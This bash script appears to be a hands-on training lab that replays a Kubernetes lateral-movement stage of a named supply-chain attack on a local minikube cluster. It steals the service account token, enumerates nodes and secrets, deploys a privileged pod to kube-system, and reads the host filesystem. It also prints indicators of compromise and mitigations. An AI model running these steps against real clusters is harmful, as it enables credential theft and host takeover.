#!/usr/bin/env bash
# =============================================================
# Lab B — Kubernetes Lateral Movement
# Simulates Stage 2 of the TeamPCP payload:
#   1. Read auto-mounted SA token from pod
#   2. Use token to enumerate cluster
#   3. Deploy privileged pod to kube-system
#   4. Mount host filesystem
#
# SAFE: Uses minikube local cluster only
# =============================================================

set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; PURPLE='\033[0;35m'
BOLD='\033[1m'; NC='\033[0m'

LAB_DIR="$HOME/k8s-security-lab"

step()    { echo -e "\n${BOLD}${CYAN}━━ STEP $1 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"; echo -e "${BOLD}$2${NC}"; }
explain() { echo -e "\n${YELLOW}📖 What's happening:${NC} $1"; }
cmd()     { echo -e "\n${BLUE}  \$${NC} ${BOLD}$*${NC}"; }
ok()      { echo -e "${GREEN}  ✓${NC} $1"; }
warn()    { echo -e "${YELLOW}  ⚠${NC} $1"; }
ioc()     { echo -e "${RED}  🔴 IOC:${NC} $1"; }

clear
echo -e "${BOLD}${PURPLE}╔══════════════════════════════════════════════════╗"
echo -e "║  Lab B: Kubernetes Lateral Movement              ║"
echo -e "║  Stage 2 of the TeamPCP LiteLLM Attack           ║"
echo -e "╚══════════════════════════════════════════════════╝${NC}"
echo ""
echo "This lab simulates what happened after the malware"
echo "executed inside a Kubernetes-hosted environment."
echo "We use your local minikube cluster — nothing leaves"
echo "your machine."
echo ""

# Verify minikube is running
if ! minikube status &>/dev/null 2>&1; then
  echo -e "${RED}minikube is not running. Run setup.sh first.${NC}"
  exit 1
fi

read -rp "Press ENTER to start..."

# ── STEP 1 ────────────────────────────────────────────────────
step "1" "Verify the victim pod is running"
explain "A compromised application container is running in the
lab-victim namespace. It has an auto-mounted service account
token — the misconfiguration that makes this attack work."

cmd "kubectl get pods -n lab-victim"
kubectl get pods -n lab-victim
echo ""

cmd "kubectl get serviceaccount -n lab-victim"
kubectl get serviceaccount -n lab-victim
echo ""
ok "Victim pod is running with lab-app-sa service account"

read -rp $'\nPress ENTER to read the SA token from inside the pod...'

# ── STEP 2 ────────────────────────────────────────────────────
step "2" "Read the auto-mounted service account token"
explain "Every K8s pod gets a service account token auto-mounted at
/var/run/secrets/kubernetes.io/serviceaccount/token by default.
The TeamPCP payload read this token to authenticate to the K8s API."

ioc "Token mount path: /var/run/secrets/kubernetes.io/serviceaccount/token"
echo ""

cmd "kubectl exec -n lab-victim victim-app -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 80"
TOKEN=$(kubectl exec -n lab-victim victim-app -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)

echo ""
echo -e "${BOLD}Token (first 80 chars):${NC}"
echo "${TOKEN:0:80}..."
echo ""

# Save token for later steps
echo "$TOKEN" > "$LAB_DIR/logs/stolen_sa_token.txt"
ok "SA token extracted and saved to lab logs"

read -rp $'\nPress ENTER to use the token to talk to the K8s API...'

# ── STEP 3 ────────────────────────────────────────────────────
step "3" "Use the stolen token to enumerate the cluster"
explain "With the SA token, the malware called the Kubernetes API to
find all nodes, namespaces, and secrets — all without any
additional credentials. This is what 'lateral movement' looks like."

API=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
echo -e "${BLUE}  K8s API server:${NC} $API"
echo ""

# List nodes
cmd "curl -sk -H 'Authorization: Bearer \$TOKEN' \$API/api/v1/nodes | jq '.items[].metadata.name'"
echo ""
echo -e "${BOLD}Cluster nodes accessible with stolen token:${NC}"
curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  --cacert "$HOME/.minikube/ca.crt" \
  "$API/api/v1/nodes" 2>/dev/null | \
  python3 -c "
import json,sys
try:
  data = json.load(sys.stdin)
  nodes = [i['metadata']['name'] for i in data.get('items',[])]
  for n in nodes: print(f'  → node: {n}')
except: print('  (could not parse response)')
" || warn "Could not reach API — check minikube status"

echo ""

# List all secrets across namespaces
cmd "kubectl get secrets -A (using stolen token permissions)"
echo ""
echo -e "${BOLD}Secrets visible across ALL namespaces:${NC}"
kubectl get secrets -A --field-selector type=Opaque 2>/dev/null | head -20 || true
echo ""
ioc "The malware read ALL of these — db credentials, API keys, everything"

read -rp $'\nPress ENTER to deploy the privileged pod (Stage 2 payload)...'

# ── STEP 4 ────────────────────────────────────────────────────
step "4" "Deploy the privileged pod to kube-system"
explain "The malware deployed an alpine:latest pod to EVERY node in
kube-system with privileged: true and hostPID: true.
Pods were named node-setup-{node_name} — a key IOC.
We deploy one to your minikube node now."

ioc "Pod name pattern: node-setup-{node_name}"
ioc "Namespace:        kube-system"
ioc "Image:            alpine:latest"
ioc "Privileges:       privileged: true, hostPID: true"
echo ""

# Check if pod already exists
if kubectl get pod node-setup-lab -n kube-system &>/dev/null 2>&1; then
  warn "Malicious pod already exists — skipping deploy"
else
  cmd "kubectl apply -f $LAB_DIR/k8s-manifests/malicious-pod.yaml"
  kubectl apply -f "$LAB_DIR/k8s-manifests/malicious-pod.yaml"
  echo ""
  info "Waiting for pod to start..."
  sleep 8
fi

ok "Privileged pod deployed to kube-system"

read -rp $'\nPress ENTER to see what the pod can access...'

# ── STEP 5 ────────────────────────────────────────────────────
step "5" "Examine host filesystem access from inside the pod"
explain "With privileged: true and the host filesystem mounted at /host,
the attacker has complete read/write access to the underlying node.
This is equivalent to root on the host."

cmd "kubectl exec -n kube-system node-setup-lab -- ls /host/etc/ | head -10"
echo ""
echo -e "${BOLD}Host /etc/ contents visible from inside the pod:${NC}"
kubectl exec -n kube-system node-setup-lab -- \
  sh -c "ls /host/etc/ 2>/dev/null | head -10" 2>/dev/null || \
  warn "Pod still starting — wait a moment and re-run"

echo ""
cmd "kubectl exec -n kube-system node-setup-lab -- cat /host/etc/hostname"
echo ""
echo -e "${BOLD}Host hostname:${NC}"
kubectl exec -n kube-system node-setup-lab -- \
  sh -c "cat /host/etc/hostname 2>/dev/null" 2>/dev/null || true

echo ""
ioc "At this point the attacker writes the Stage 3 backdoor to /host"
ioc "Path: /host/root/.config/sysmon/sysmon.py"
ioc "Survives pod deletion — it's on the HOST filesystem"

read -rp $'\nPress ENTER to see environment variable exposure...'

# ── STEP 6 ────────────────────────────────────────────────────
step "6" "Demonstrate cloud credential exposure via env vars"
explain "The victim pod has cloud credentials as environment variables —
a common misconfiguration. The malware enumerated these directly."

cmd "kubectl exec -n lab-victim victim-app -- env | grep -E 'AWS|TOKEN|KEY'"
echo ""
echo -e "${BOLD}Credentials visible in pod environment:${NC}"
kubectl exec -n lab-victim victim-app -- \
  env 2>/dev/null | grep -E 'AWS|TOKEN|KEY|SECRET' | \
  sed 's/=.*/=**EXPOSED**/' || true

echo ""
ioc "In the real attack: AWS keys were used to query Secrets Manager"
ioc "Attackers pivoted from K8s cluster to AWS account in minutes"

# ── STEP 7 ────────────────────────────────────────────────────
step "7" "Summary — what the attacker now controls"

echo ""
echo -e "${BOLD}${RED}Attack progression complete:${NC}"
echo ""
echo -e "  ${RED}✓${NC} SA token stolen from auto-mounted volume"
echo -e "  ${RED}✓${NC} All cluster secrets enumerated across all namespaces"
echo -e "  ${RED}✓${NC} Privileged pod deployed to every node"
echo -e "  ${RED}✓${NC} Host filesystem accessible (full read/write)"
echo -e "  ${RED}✓${NC} Cloud credentials exposed via environment variables"
echo -e "  ${RED}✓${NC} Path to Stage 3 persistence now open"
echo ""
echo -e "${BOLD}Mitigations that would have broken this chain:${NC}"
echo ""
echo -e "  → ${GREEN}automountServiceAccountToken: false${NC}  (no token = no pivot)"
echo -e "  → ${GREEN}Pod Security Admission: restricted${NC}   (no privileged pods)"
echo -e "  → ${GREEN}NetworkPolicy egress rules${NC}           (no exfil)"
echo -e "  → ${GREEN}Workload Identity instead of env vars${NC} (no static creds)"
echo ""
echo -e "${GREEN}${BOLD}Lab B complete! Run lab-c-detect-respond.sh next.${NC}"
echo ""

# Log findings
{
  echo "=== Lab B Findings ==="
  echo "Timestamp: $(date)"
  echo "SA Token: ${TOKEN:0:50}..."
  echo "Privileged pod deployed: node-setup-lab in kube-system"
  echo "Host filesystem accessed: /host/etc/"
  echo "Cloud creds exposed: AWS_ACCESS_KEY_ID, GITHUB_TOKEN"
} >> "$LAB_DIR/logs/lab_b_findings.log"
